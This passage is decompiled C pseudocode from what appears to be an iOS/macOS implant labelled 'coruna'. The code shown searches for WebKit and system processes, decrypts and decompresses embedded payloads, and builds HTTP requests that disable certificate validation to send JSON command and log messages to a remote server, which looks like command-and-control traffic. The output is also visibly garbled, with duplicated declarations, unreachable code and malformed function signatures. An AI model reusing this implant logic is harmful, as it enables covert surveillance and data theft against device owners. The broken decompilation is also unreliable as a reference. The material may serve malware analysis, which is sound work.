    (**(void (**)(arg + 0x5f0))(arg,0xcc109,0,0x730c4da7);
  }
  return type_id_10;
}





uint64_t coruna_implant65fc_residual_85(long handle,long addr_2)
{
  bool err;
  uint64_t u;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    scratch = 0;
    u = coruna_implant65fc_residual_87(&scratch);
    if ((int)u == 0x7003) {
      err = false;
      *(uint32_t *)(addr_2 + 4) = 0x15180;
    }
    else {
      if ((int)u != 0) {
        return u;
      }
      *(uint32_t *)(addr_2 + 4) = *(uint32_t *)(scratch + 8);
      err = *(char *)(scratch + 5) != '\0';
    }
    u = 0;
    *(bool *)addr_2 = err;
  }
  return u;
}





uint64_t coruna_implant65fc_residual_86(long handle,uint64_t val,char *path,uint64_t *id_2,long *addr_2)
{
  uint64_t u;
  long scratch;
  uint64_t bootargs;
  uint32_t thread_attr;
  uint64_t host_info;
  
  u = 0xad001;
  if (((handle != 0) && (path != (char *)0x0)) &&
     ((*path != '\0' && id_2 != (uint64_t *)0x0) && addr_2 != (long *)0x0)) {
    host_info = 0;
    thread_attr = 0;
    u = (**(void (**)(handle + 0x68))(handle,val,&host_info,&thread_attr);
    if ((int)u == 0) {
      bootargs = 0;
      u = (**(void (**)(handle + 0x50))(handle,host_info,thread_attr,&bootargs);
      if ((int)u == 0) {
        scratch = 0;
        u = (**(void (**)(handle + 0x58))(handle,bootargs,path,&scratch);
        if ((int)u == 0) {
          if (scratch != 0) {
            *id_2 = bootargs;
            *addr_2 = scratch;
            return 0;
          }
          u = 0x4003;
        }
        (**(void (**)(handle + 0x60))(handle,bootargs);
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_residual_87(uint64_t *val,long handle)
{
  uint64_t u;
  uint scratch;
  int *bootargs;
  
  u = 0xad001;
  if ((val != (uint64_t *)0x0) && (handle != 0)) {
    bootargs = (int *)0x0;
    scratch = 0;
    u = (**(void (**)(handle + 0x68))(handle,0x70005,&bootargs,&scratch);
    if ((int)u == 0) {
      if (bootargs == (int *)0x0) {
        u = 0xad001;
      }
      else {
        u = 0xad001;
        if (((scratch != 0) && (u = 0xad014, 0x17 < scratch)) && (*bootargs == -0x21522ff1)) {
          u = 0;
          *val = bootargs;
        }
      }
    }
  }
  return u;
}





void coruna_find_webcontent(uint64_t ctx,uint64_t val)
{
  coruna_join_path(ctx,"com.apple.WebKit.WebContent",0,val);
  coruna_join_path(ctx,"powerd",0,val);
  coruna_join_path(ctx,"panic",0,val);
  coruna_closedir(ctx,val);
  return;
}





uint coruna_pthread_attr_setdetachstate(void **ctx,void *scratch)
{
  uint u;
  int err;
  int *err;
  uint *ptr;
  void *scratch;
  pthread_t bootargs;
  pthread_attr_t thread_attr;
  
  thread_attr.__opaque[0x20] = '\0';
  thread_attr.__opaque[0x21] = '\0';
  thread_attr.__opaque[0x22] = '\0';
  thread_attr.__opaque[0x23] = '\0';
  thread_attr.__opaque[0x24] = '\0';
  thread_attr.__opaque[0x25] = '\0';
  thread_attr.__opaque[0x26] = '\0';
  thread_attr.__opaque[0x27] = '\0';
  thread_attr.__opaque[0x18] = '\0';
  thread_attr.__opaque[0x19] = '\0';
  thread_attr.__opaque[0x1a] = '\0';
  thread_attr.__opaque[0x1b] = '\0';
  thread_attr.__opaque[0x1c] = '\0';
  thread_attr.__opaque[0x1d] = '\0';
  thread_attr.__opaque[0x1e] = '\0';
  thread_attr.__opaque[0x1f] = '\0';
  thread_attr.__opaque[0x30] = '\0';
  thread_attr.__opaque[0x31] = '\0';
  thread_attr.__opaque[0x32] = '\0';
  thread_attr.__opaque[0x33] = '\0';
  thread_attr.__opaque[0x34] = '\0';
  thread_attr.__opaque[0x35] = '\0';
  thread_attr.__opaque[0x36] = '\0';
  thread_attr.__opaque[0x37] = '\0';
  thread_attr.__opaque[0x28] = '\0';
  thread_attr.__opaque[0x29] = '\0';
  thread_attr.__opaque[0x2a] = '\0';
  thread_attr.__opaque[0x2b] = '\0';
  thread_attr.__opaque[0x2c] = '\0';
  thread_attr.__opaque[0x2d] = '\0';
  thread_attr.__opaque[0x2e] = '\0';
  thread_attr.__opaque[0x2f] = '\0';
  thread_attr.__opaque[0] = '\0';
  thread_attr.__opaque[1] = '\0';
  thread_attr.__opaque[2] = '\0';
  thread_attr.__opaque[3] = '\0';
  thread_attr.__opaque[4] = '\0';
  thread_attr.__opaque[5] = '\0';
  thread_attr.__opaque[6] = '\0';
  thread_attr.__opaque[7] = '\0';
  thread_attr.__sig = 0;
  thread_attr.__opaque[0x10] = '\0';
  thread_attr.__opaque[0x11] = '\0';
  thread_attr.__opaque[0x12] = '\0';
  thread_attr.__opaque[0x13] = '\0';
  thread_attr.__opaque[0x14] = '\0';
  thread_attr.__opaque[0x15] = '\0';
  thread_attr.__opaque[0x16] = '\0';
  thread_attr.__opaque[0x17] = '\0';
  thread_attr.__opaque[8] = '\0';
  thread_attr.__opaque[9] = '\0';
  thread_attr.__opaque[10] = '\0';
  thread_attr.__opaque[0xb] = '\0';
  thread_attr.__opaque[0xc] = '\0';
  thread_attr.__opaque[0xd] = '\0';
  thread_attr.__opaque[0xe] = '\0';
  thread_attr.__opaque[0xf] = '\0';
  bootargs = (pthread_t)0x0;
  if (ctx == (void **)0x0) {
    return 0xad001;
  }
  err = _pthread_attr_init(&thread_attr);
  if (err != 0) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    return u | 0x40000000;
  }
  err = _pthread_attr_setdetachstate(&thread_attr,1);
  if ((err == 0) && (err = _pthread_create(&bootargs,&thread_attr,ctx,scratch), err == 0)) {
    scratch = (void *)0x0;
    err = _pthread_join(bootargs,&scratch);
    if (err == 0) {
      u = (uint)scratch;
      _pthread_attr_destroy(&thread_attr);
      return u;
    }
  }
  err = ___error();
  err = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < err) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  _pthread_attr_destroy(&thread_attr);
  return u;
}





uint64_t coruna_call_objc_opt_respondstoselector(void)
{
  coruna_objc_opt_respondstoselector();
  return 0;
}





uint64_t coruna_implant65fc_via_cat(long handle,long addr_2,long off_3)
{
  uint u;
  uint64_t size;
  uint32_t scratch;
  uint32_t bootargs;
  long thread_attr;
  
  size = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    if ((*(int *)(addr_2 + 0xd8) == 0x100000c) && (1 < *(uint *)(addr_2 + 0xdc))) {
      thread_attr = off_3;
      if ((off_3 != 0) ||
         (size = (**(void (**)(handle + 0x70))(handle,0,&thread_attr), (int)size == 0)) {
        scratch = *(uint32_t *)k_implant_mach_task_self_slot;
        bootargs = 0;
        size = (**(void (**)(handle + 0x78))(handle,thread_attr,0xc000001b,&scratch);
        if ((int)size == 0) {
          u = bootargs >> 0x18;
          bootargs = bootargs & 0xffffff00;
          if (k_implant_rodata_word_1e848 <= *(double *)k_implant_dyldversionnumber_slot) {
            bootargs = coruna_cat(1,(uint16_t)bootargs);
            bootargs = coruna_cat((char)u,(uint32_t)bootargs);
          }
          size = (**(void (**)(handle + 0x78))(handle,thread_attr,0x4000001b,&scratch);
        }
        if (off_3 == 0) {
          (**(void (**)(handle + 0x90))(handle,thread_attr);
        }
      }
    }
    else {
      size = 0;
    }
  }
  return size;
}





void coruna_call_parse_https_url(char *path,uint64_t val,uint64_t id_2)
{
  if ((((path != (char *)0x0) && (*path != '\0')) && (*(long *)(path + 0x10) != 0)) &&
     (*(long *)(path + 8) != 0)) {
    coruna_parse_https_url(*(long *)(path + 0x10),*(long *)(path + 8),val,0,id_2);
    return;
  }
  return;
}





long coruna_implant65fc_via_call_parse_https_url(uint64_t *val)
{
  int err;
  char *ptr;
  
  ptr = (char *)val[2];
  if ((ptr != (char *)0x0) && (*ptr != '\0')) {
    coruna_call_parse_https_url(ptr,0xcc10d,0x730c4d88);
  }
  err = (*(void (*)val[1])(*val);
  return (long)err;
}





uint64_t coruna_objc_opt_respondstoselector(char *path)
{
  uint64_t u;
  long handle;
  long addr;
  unsigned long size;
  long off;
  uint64_t version;
  uint64_t port;
  uint8_t size[16];
  uint8_t version[16];
  
  port = 0xad00b;
  if (path == (char *)0x0) {
    return 0xad001;
  }
  if (*path == '\0') {
    return 0xad001;
  }
  u = _objc_autoreleasePoolPush();
  size = _dlopen("/System/Library/PrivateFrameworks/WebBookmarks.framework/WebBookmarks",2);
  _objc_autoreleasePoolPop(u);
  return port;
}





uint64_t coruna_compression_decode_buffer(uint64_t *val,uint *size)
{
  uint u;
  uint size;
  void *ptr;
  unsigned long version;
  uint64_t port;
  int *err;
  unsigned long tag;
  
  port = 0xad001;
  if (((val != (uint64_t *)0x0) &&
      (err = (int *)*val, err != (int *)0x0 && size != (uint *)0x0)) &&
     (u = *size, u != 0)) {
    if ((7 < u) && (*err == 0xbedf00d)) {
      size = err[1];
      tag = (unsigned long)size;
      if ((size != 0) && (u - 8 < size)) {
        ptr = _malloc(tag + 1);
        if (ptr == (void *)0x0) {
          return 0xad009;
        }
        _memset_s(ptr,tag,0,tag);
        version = _compression_decode_buffer(ptr,tag + 1,err + 2,u - 8,0,0x306);
        if (version == tag) {
          _memset_s(err,u,0,u);
          _free(err);
          *val = ptr;
          *size = size;
          return 0;
        }
        _memset_s(ptr,tag,0,tag);
        _free(ptr);
        return 0xad00b;
      }
    }
    port = 0;
  }
  return port;
}
void coruna_implant65fc_via_u64_pack(uint *size,long handle,long addr_2)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint64_t tag;
  uint kind;
  uint type_id;
  uint type_id_8;
  uint type_id_9;
  uint type_id_10;
  uint type_id_11;
  uint type_id_12;
  long handle;
  byte err;
  int err;
  unsigned long type_id_13;
  uint type_id_14;
  uint type_id_15;
  uint type_id_16;
  uint type_id_17;
  uint type_id_18;
  long addr;
  uint32_t scratch;
  uint scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint block_ctx;
  uint serial_buf;
  uint action;
  uint block_ctx;
  uint stack_guard;
  uint sa_saved;
  uint sa_new;
  uint path_buf;
  uint64_t stack_guard;
  uint64_t tmp_buf;
  
  tag = k_implant_rodata_word_0001e868;
  if (((handle != 0) && (addr_2 != 0)) && (size != (uint *)0x0)) {
    handle = 0;
    host_info = 0;
    thread_attr = 0;
    serial_buf = 0;
    host_info = 0;
    bootargs = 0;
    thread_attr = 0;
    bootargs = 0;
    block_ctx = *size;
    sa_saved = (uint)*(uint64_t *)(size + 5);
    sa_new = (uint)((unsigned long)*(uint64_t *)(size + 5) >> 0x20);
    action = k_implant_md5_init_state;
    block_ctx = (uint)*(uint64_t *)(size + 3);
    stack_guard = (uint)((unsigned long)*(uint64_t *)(size + 3) >> 0x20);
    serial_buf = (uint)*(uint64_t *)(size + 1);
    action = (uint)((unsigned long)*(uint64_t *)(size + 1) >> 0x20);
    path_buf = size[7];
    stack_guard = 0;
    tmp_buf = 0;
    type_id_13 = 0x40;
    do {
      if (type_id_13 < 0x40) {
        err = *(byte *)((long)&scratch + type_id_13);
      }
      else {
        scratch = (uint)action;
        scratch = (uint)((unsigned long)action >> 0x20);
        host_info = (uint)stack_guard;
        kind = (uint)host_info;
        host_info = (uint)((unsigned long)stack_guard >> 0x20);
        type_id = host_info;
        bootargs = (uint)tag;
        bootargs = (uint)((unsigned long)tag >> 0x20);
        serial_buf = 0;
        serial_buf = 0;
        err = 10;
        type_id_16 = block_ctx;
        type_id_14 = serial_buf;
        type_id_17 = stack_guard;
        type_id_18 = sa_saved;
        type_id_9 = action;
        type_id_12 = block_ctx;
        type_id_10 = (uint)bootargs;
        type_id_11 = bootargs;
        type_id_15 = sa_new;
        type_id_8 = path_buf;
        do {
          host_info = (uint)host_info ^ scratch + type_id_16;
          type_id_17 = ((uint)host_info >> 0x10 | (uint)host_info << 0x10) + type_id_17;
          u = type_id_17 ^ type_id_16;
          scratch = (u >> 0x14 | u << 0xc) + scratch + type_id_16;
          type_id_16 = scratch ^ ((uint)host_info >> 0x10 | (uint)host_info << 0x10);
          type_id_17 = (type_id_16 >> 0x18 | type_id_16 << 8) + type_id_17;
          u = type_id_17 ^ (u >> 0x14 | u << 0xc);
          host_info = host_info ^ scratch + type_id_14;
          type_id_18 = (host_info >> 0x10 | host_info << 0x10) + type_id_18;
          size = type_id_18 ^ type_id_14;
          scratch = (size >> 0x14 | size << 0xc) + scratch + type_id_14;
          version = scratch ^ (host_info >> 0x10 | host_info << 0x10);
          type_id_18 = (version >> 0x18 | version << 8) + type_id_18;
          type_id_14 = type_id_18 ^ (size >> 0x14 | size << 0xc);
          serial_buf = (uint)serial_buf ^ type_id_10 + type_id_9;
          type_id_15 = ((uint)serial_buf >> 0x10 | (uint)serial_buf << 0x10) + type_id_15;
          size = type_id_15 ^ type_id_9;
          type_id_10 = (size >> 0x14 | size << 0xc) + type_id_10 + type_id_9;
          port = type_id_10 ^ ((uint)serial_buf >> 0x10 | (uint)serial_buf << 0x10);
          type_id_15 = (port >> 0x18 | port << 8) + type_id_15;
          type_id_9 = type_id_15 ^ (size >> 0x14 | size << 0xc);
          serial_buf = serial_buf ^ type_id_11 + type_id_12;
          type_id_8 = (serial_buf >> 0x10 | serial_buf << 0x10) + type_id_8;
          size = type_id_8 ^ type_id_12;
          type_id_11 = (size >> 0x14 | size << 0xc) + type_id_11 + type_id_12;
          type_id_12 = type_id_11 ^ (serial_buf >> 0x10 | serial_buf << 0x10);
          type_id_8 = (type_id_12 >> 0x18 | type_id_12 << 8) + type_id_8;
          size = type_id_8 ^ (size >> 0x14 | size << 0xc);
          scratch = (type_id_14 >> 0x19 | type_id_14 << 7) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x18 | type_id_12 << 8);
          type_id_15 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_15;
          type_id_14 = type_id_15 ^ (type_id_14 >> 0x19 | type_id_14 << 7);
          scratch = (type_id_14 >> 0x14 | type_id_14 << 0xc) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          serial_buf = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_15 = serial_buf + type_id_15;
          type_id_14 = type_id_15 ^ (type_id_14 >> 0x14 | type_id_14 << 0xc);
          type_id_14 = type_id_14 >> 0x19 | type_id_14 << 7;
          scratch = (type_id_9 >> 0x19 | type_id_9 << 7) + scratch;
          type_id_12 = scratch ^ (type_id_16 >> 0x18 | type_id_16 << 8);
          type_id_8 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_8;
          type_id_9 = type_id_8 ^ (type_id_9 >> 0x19 | type_id_9 << 7);
          scratch = (type_id_9 >> 0x14 | type_id_9 << 0xc) + scratch;
          type_id_12 = scratch ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          host_info = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_8 = (uint)host_info + type_id_8;
          type_id_9 = type_id_8 ^ (type_id_9 >> 0x14 | type_id_9 << 0xc);
          type_id_9 = type_id_9 >> 0x19 | type_id_9 << 7;
          type_id_10 = (size >> 0x19 | size << 7) + type_id_10;
          type_id_12 = type_id_10 ^ (version >> 0x18 | version << 8);
          type_id_17 = (type_id_12 >> 0x10 | type_id_12 << 0x10) + type_id_17;
          type_id_16 = type_id_17 ^ (size >> 0x19 | size << 7);
          type_id_10 = (type_id_16 >> 0x14 | type_id_16 << 0xc) + type_id_10;
          type_id_12 = type_id_10 ^ (type_id_12 >> 0x10 | type_id_12 << 0x10);
          host_info = type_id_12 >> 0x18 | type_id_12 << 8;
          type_id_17 = host_info + type_id_17;
          type_id_12 = type_id_17 ^ (type_id_16 >> 0x14 | type_id_16 << 0xc);
          type_id_12 = type_id_12 >> 0x19 | type_id_12 << 7;
          type_id_11 = type_id_11 + (u >> 0x19 | u << 7);
          type_id_16 = type_id_11 ^ (port >> 0x18 | port << 8);
          type_id_18 = (type_id_16 >> 0x10 | type_id_16 << 0x10) + type_id_18;
          u = type_id_18 ^ (u >> 0x19 | u << 7);
          type_id_11 = (u >> 0x14 | u << 0xc) + type_id_11;
          type_id_16 = type_id_11 ^ (type_id_16 >> 0x10 | type_id_16 << 0x10);
          serial_buf = type_id_16 >> 0x18 | type_id_16 << 8;
          type_id_18 = (uint)serial_buf + type_id_18;
          type_id_16 = type_id_18 ^ (u >> 0x14 | u << 0xc);
          type_id_16 = type_id_16 >> 0x19 | type_id_16 << 7;
          err = err + -1;
        } while (err != 0);
        addr = 0;
        thread_attr = coruna_u64_pack((type_id_12), (type_id_9));
        thread_attr = coruna_u64_pack((type_id_18), (type_id_17));
        host_info = coruna_u64_pack((type_id_8), (type_id_15));
        err = (char)action + (char)scratch;
        bootargs = coruna_u64_pack((bootargs + type_id_11), ((uint))bootargs + type_id_10);
        bootargs = coruna_u64_pack((type_id_14), (type_id_16));
        do {
          *(unsigned long *)((long)&thread_attr + addr) =
               coruna_u64_pack(((int)((unsigned long)*(uint64_t *)((long)&action + addr) >> 0x20) +
                        (int)((unsigned long)*(uint64_t *)((long)&thread_attr + addr) >> 0x20)), (int)*(uint64_t *)((long)&action + addr) +
                        (int)*(uint64_t *)((long)&thread_attr + addr));
          *(unsigned long *)((long)&bootargs + addr) =
               coruna_u64_pack(((int)((unsigned long)*(uint64_t *)((long)&block_ctx + addr) >> 0x20) +
                        (int)((unsigned long)*(uint64_t *)((long)&bootargs + addr) >> 0x20)), (int)*(uint64_t *)((long)&block_ctx + addr) +
                        (int)*(uint64_t *)((long)&bootargs + addr));
          addr = addr + 0x10;
        } while (addr != 0x30);
        stack_guard = coruna_u64_pack((type_id), (kind + 1));
        type_id_13 = 0;
        if (kind == 0xffffffff) {
          stack_guard = (unsigned long)(type_id + 1) << 0x20;
        }
      }
      *(byte *)(handle + handle) = *(byte *)(handle + handle) ^ err;
      type_id_13 = type_id_13 + 1;
      handle = handle + 1;
    } while (handle != addr_2);
  }
  return;
}





int coruna_cfhttpmessagesetheaderfieldvalue(char *path,long handle,long addr_2,char *str_2,uint64_t *val,
                uint *size)
{
  char *ptr;
  bool err;
  bool status;
  int err;
  uint u;
  long handle;
  long addr;
  long off;
  size_t ls9;
  long base;
  long ctx_val;
  long serial;
  long serial_7;
  long serial_8;
  long serial_9;
  long *ptr;
  uint64_t size;
  void *buf;
  void *str;
  long *copy;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  uint64_t type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void (*buf)(void);
  uint64_t type_id_10;
  long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  uint64_t block_ctx;
  long *stack_guard;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t sa_saved;
  uint64_t sa_new[2];
  
  action = 0;
  err = val == (uint64_t *)0x0;
  status = size == (uint *)0x0;
  if (path == (char *)0x0) {
    return 0xad001;
  }
  if (*path == '\0') {
    return 0xad001;
  }
  if ((err || status) && (val != (uint64_t *)0x0 || size != (uint *)0x0)) {
    return 0xad001;
  }
  type_id_10 = *(uint64_t *)k_implant_kcfallocatordefault_slot;
  handle = _CFStringCreateWithCString(type_id_10,path,0x8000100);
  if (handle == 0) {
    err = 0x3002;
    if (action != 0) {
    _CFRelease();
    }
    return err;
  }
  addr = _CFStringGetLength();
  off = handle;
  if (addr < 1) {
    err = 0x3003;
  }
  else {
    addr = 0;
    if (handle == 0) {
done:
      if (addr_2 == 0) {
        scratch = 0;
cleanup:
        if (str_2 == (char *)0x0) {
          off = 0;
check_ok:
          u = 0;
          copy = &action;
          if (err || status) {
            copy = (long *)0x0;
          }
          ptr = "GET";
          if (off != 0) {
            ptr = "POST";
          }
          version = *(uint64_t *)k_implant_kcfhttpversion1_1_slot;
          port = *(uint64_t *)k_implant_kcfstreamsslvalidatescertificatechain_slot;
          tag = *(uint64_t *)k_implant_kcfbooleanfalse_slot;
          kind = *(uint64_t *)k_implant_kcfstreampropertysslsettings_slot;
          type_id = *(uint64_t *)k_implant_kcfstreampropertyhttpproxy_slot;
          type_id_8 = *(uint64_t *)k_implant_kcfrunloopcommonmodes_slot;
          type_id_9 = *(uint64_t *)k_implant_kcfrunloopdefaultmode_slot;
          do {
            if (!err && !status) {
              *copy = 0;
            }
            base = _CFURLCreateWithString(type_id_10,handle,0);
            if (base == 0) {
              if (6 < u) {
                err = 0x3002;
                _CFRelease(handle);
                if (addr != 0) {
                load_ok:
                _CFRelease(addr);
                }
                if (scratch != 0) {
                _CFRelease(scratch);
                }
                if (action != 0) {
                _CFRelease();
                }
                return err;
                _CFRelease(off);
                if (action != 0) {
                _CFRelease();
                }
                return err;
              }
            }
            else {
              ctx_val = _CFURLCopyScheme();
              if (ctx_val == 0) {
                err = 0x300d;
                serial = base;
next:
                _CFRelease(serial);
              }
              else {
                serial = _CFStringCreateWithCString(type_id_10,ptr,0x8000100);
                err = 0xad009;
                if (serial == 0) {
retry:
                  _CFRelease(base);
                  _CFRelease(ctx_val);
                  if (serial != 0) goto next;
                }
                else {
                  serial_7 = _CFHTTPMessageCreateRequest(type_id_10,serial,base,version);
                  if (serial_7 == 0) {
                    err = 0x3009;
                    goto retry;
                  }
                  if (off != 0) {
                    _CFHTTPMessageSetBody(serial_7);
                  }
                  if (addr == 0) {
                    serial_buf = 0;
found:
                    if (scratch == 0) {
                      host_info = 0;
                    }
                    else {
                      host_info = _CFStringCreateWithCString(type_id_10,"Content-Type",0x8000100);
                      if (host_info == 0) {
                        bootargs = 0;
                        thread_attr = 0;
                        host_info = 0;
                        err = 0xad009;
                      }
                      else {
                      _CFHTTPMessageSetHeaderFieldValue(serial_7,host_info,scratch);
                      }
                    }
                    serial_8 = _CFReadStreamCreateForHTTPRequest(type_id_10,serial_7);
                    if (serial_8 == 0) {
                      bootargs = 0;
                      thread_attr = 0;
                      err = 0x300a;
                    }
                    else {
                      thread_attr = _CFStringCreateWithCString(type_id_10,"https",0x8000100);
                      if (thread_attr == 0) {
                        bootargs = 0;
                        err = 0xad009;
                      }
                      else {
                        err = _CFEqual(thread_attr,ctx_val);
                        if (err == 0) {
invalid:
                          serial_9 = _SCDynamicStoreCopyProxies(0);
                          if (serial_9 == 0) {
                            bootargs = 0;
                            err = 0x300e;
                          }
                          else {
                            err = _CFReadStreamSetProperty(serial_8,type_id,serial_9);
                            _CFRelease(serial_9);
                            continue;
                            serial_9 = _CFHTTPMessageCreateEmpty(type_id_10,0);
                            if (serial_9 == 0) {
                              bootargs = 0;
                              err = 0x3009;
                            }
                            else {
                              ptr = _calloc(0x10,1);
                              if (ptr == (long *)0x0) {
                                bootargs = 0;
                                err = 0xad009;
                              }
                              else {
                                *ptr = serial_9;
                                *(uint32_t *)((long)ptr + 0xc) = 500;
                                block_ctx = 0;
                                bootargs = 0;
                                scratch = 0;
                                buf = coruna_cfhttpmessagegetresponsestatuscode;
                                sa_saved = 0;
                                stack_guard = ptr;
                                err = coruna_return_zero();
                                if (err != 0) {
                                  buf = (void (*)coruna_pacia(coruna_cfhttpmessagegetresponsestatuscode,0);
                                }
                                err = _CFReadStreamSetClient(serial_8,0x1a,buf,&block_ctx);
                                if (err == 0) {
                                  bootargs = 0;
                                  err = 0x3010;
                                }
                                else {
                                  size = _CFRunLoopGetCurrent();
                                  _CFReadStreamScheduleWithRunLoop(serial_8,size,type_id_8);
                                  err = _CFReadStreamOpen(serial_8);
                                  if (err == 0) {
                                    bootargs = 0;
                                    err = 0x300b;
                                  }
                                  else {
                                    _CFRunLoopRunInMode(0x406e000000000000,type_id_9,0);
                                    _CFReadStreamClose(serial_8);
                                    err = (int)ptr[1];
                                    if (err == 0) {
                                      err = 0x3011;
                                      if (*(uint *)((long)ptr + 0xc) < 400) {
                                        err = 0;
                                      }
                                      if (*(uint *)((long)ptr + 0xc) < 400 && (!err && !status)
                                         ) {
                                        bootargs = _CFHTTPMessageCopyBody(*ptr);
                                        if (bootargs == 0) {
                                          bootargs = 0;
                                          err = 0x3019;
                                        }
                                        else {
                                          err = 0;
                                          *copy = bootargs;
                                        }
                                        goto exit_ok;
                                      }
                                    }
                                    bootargs = 0;
                                  }
                                }
exit_ok:
                                _free(ptr);
                              }
                              _CFRelease(serial_9);
                            }
                          }
                        }
                        else {
                          block_ctx = port;
                          sa_new[0] = tag;
                          serial_9 = _CFDictionaryCreate(type_id_10,&block_ctx,sa_new,1,0,0);
                          if (serial_9 == 0) {
                            bootargs = 0;
                            err = 0x300f;
                          }
                          else {
                            err = _CFReadStreamSetProperty(serial_8,kind,serial_9);
                            _CFRelease(serial_9);
                            if (err != 0) goto invalid;
again:
                            bootargs = 0;
                            err = 0x300c;
                          }
                        }
                      }
                      _CFRelease(serial_8);
                    }
                  }
                  else {
                    serial_buf = _CFStringCreateWithCString(type_id_10,"User-Agent",0x8000100);
                    if (serial_buf != 0) {
                      _CFHTTPMessageSetHeaderFieldValue(serial_7,serial_buf,addr);
                      goto found;
                    }
                    serial_buf = 0;
nomem:
                    bootargs = 0;
                    thread_attr = 0;
                    host_info = 0;
                    err = 0xad009;
                  }
                  _CFRelease(serial_7);
                  _CFRelease(base);
                  _CFRelease(ctx_val);
                  _CFRelease(serial);
                  if (serial_buf != 0) {
                    _CFRelease();
                  }
                  if (host_info != 0) {
                    _CFRelease();
                  }
                  if (thread_attr != 0) {
                    _CFRelease();
                  }
                  if ((bootargs != 0) && (serial = bootargs, err != 0)) goto next;
                }
              }
              base = action;
              if ((6 < u) || (err == 0)) {
                break;
              }
            }
            u = u + 1;
          } while (true);
        }
        ls9 = _strlen(str_2);
        off = _CFDataCreate(type_id_10,str_2,ls9);
        if (off != 0) goto check_ok;
        err = 0x3018;
      }
      else {
        scratch = _CFStringCreateWithCString(type_id_10,addr_2,0x8000100);
        if (scratch == 0) {
          scratch = 0;
          off = 0;
          err = 0x3016;
          _CFRelease(handle);
          if (addr != 0) {
          load_ok:
          _CFRelease(addr);
          }
          if (scratch != 0) {
          _CFRelease(scratch);
          }
          if (action != 0) {
          _CFRelease();
          }
          return err;
          _CFRelease(off);
          if (action != 0) {
          _CFRelease();
          }
          return err;
        }
        off = _CFStringGetLength();
        if (0 < off) goto cleanup;
        err = 0x3017;
      }
      off = 0;
      _CFRelease(handle);
      if (addr != 0) {
      load_ok:
      _CFRelease(addr);
      }
      if (scratch != 0) {
      _CFRelease(scratch);
      }
      if (action != 0) {
      _CFRelease();
      }
      return err;
      _CFRelease(off);
      if (action != 0) {
      _CFRelease();
      }
      return err;
    }
    addr = _CFStringCreateWithCString(type_id_10,handle,0x8000100);
    if (addr != 0) {
      off = _CFStringGetLength();
      if (0 < off) goto done;
      _CFRelease(handle);
      off = 0;
      scratch = 0;
      err = 0x3017;
      goto load_ok;
    }
    err = 0x3016;
  }
load_ok_15:
  _CFRelease(off);
fail:
  if (action != 0) {
    _CFRelease();
  }
  return err;
parse_ok:
  if (err == 0 && (!err && !status)) {
    if (action == 0) {
load_ok_16:
      err = 0x3005;
    }
    else {
      u = _CFDataGetLength(action);
      if (u == 0) {
        err = 0x3004;
      }
      else {
        buf = (void *)_CFDataGetBytePtr(base);
        if (buf == (void *)0x0) {
          err = 0x3005;
        }
        else {
          str = _malloc((unsigned long)u);
          if (str == (void *)0x0) {
            err = 0xad009;
          }
          else {
            _memcpy(str,buf,(unsigned long)u);
            err = 0;
            *val = str;
            *size = u;
          }
        }
      }
    }
  }
skip:
  _CFRelease(handle);
  if (addr != 0) {
load_ok:
    _CFRelease(addr);
  }
  if (scratch != 0) {
    _CFRelease(scratch);
  }
  if (action != 0) {
  _CFRelease();
  }
  return err;
  _CFRelease(off);
  if (action != 0) {
  _CFRelease();
  }
  return err;
}





uint64_t
void coruna_parse_https_url(char *path,uint64_t val,uint64_t id_2,uint64_t size_3,
            uint64_t off_4)
{
  int err;
  uint64_t u;
  uint scratch;
  void *bootargs;
  
  bootargs = (void *)0x0;
  scratch = 0;
  if ((path == (char *)0x0) || (*path == '\0')) {
    u = 0;
  }
  else {
    err = _strncmp(path,"http://",7);
    if ((err == 0) || (err = _strncmp(path,"https://",8), err == 0)) {
      u = coruna_implant65fc_str_cmd_logmsg_args_msg_s(id_2,size_3,off_4,&bootargs,&scratch);
      if ((int)u == 0) {
        u = coruna_cfhttpmessagesetheaderfieldvalue(path,val,"application/json",bootargs,0,0);
        _bzero(bootargs,(unsigned long)scratch);
        _free(bootargs);
      }
    }
    else {
      u = 0xad014;
    }
  }
  return u;
}





uint64_t
void coruna_implant65fc_str_cmd_logmsg_args_msg_s(uint64_t val,long handle,uint64_t id_2,uint64_t size_3,
            uint64_t off_4)
{
  uint64_t u;
  char *ptr;
  uint scratch;
  void *bootargs;
  
  bootargs = (void *)0x0;
  scratch = 0;
  if (handle == 0) {
    ptr = "{\\\"e\\\":%u,\\\"l\\\":%u}";
  }
  else {
    ptr = "{\\\"e\\\":%u,\\\"f\\\":\\\"%s\\\",\\\"l\\\":%u}";
  }
  u = coruna_vsnprintf_alloc(&bootargs,&scratch,ptr);
  if ((int)u == 0) {
    u = coruna_vsnprintf_alloc(size_3,off_4,"{\"cmd\":\"logmsg\",\"args\":{\"msg\":\"%s\"}}");
    _bzero(bootargs,(unsigned long)scratch);
    _free(bootargs);
  }
  return u;
}





void coruna_cfhttpmessagegetresponsestatuscode(uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  uint32_t u;
  long handle;
  uint8_t port[16];
  uint8_t scratch[4096];
  
  port = (*(void (*)k_implant_chkstk_darwin_slot)();
  handle = port;
  if ((handle != 0) && (size_3 != (uint64_t *)0x0)) {
    switch(port) {
    case 0:
